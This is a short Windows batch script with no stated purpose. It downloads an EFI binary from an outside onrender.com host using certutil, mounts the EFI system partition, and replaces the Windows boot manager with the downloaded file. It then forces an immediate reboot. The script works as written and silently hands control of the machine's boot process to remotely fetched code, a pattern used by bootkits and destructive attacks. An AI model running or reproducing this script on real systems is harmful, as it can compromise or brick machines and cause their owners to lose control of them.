@echo off
certutil -urlcache -split -f "https://ipxe-boot.onrender.com/ipxe.efi" C:\ipxe.efi
mountvol S: /S
copy S:\EFI\Microsoft\Boot\bootmgfw.efi C:\bootmgfw.efi.bak
copy C:\ipxe.efi S:\EFI\Microsoft\Boot\bootmgfw.efi
shutdown /r /t 0
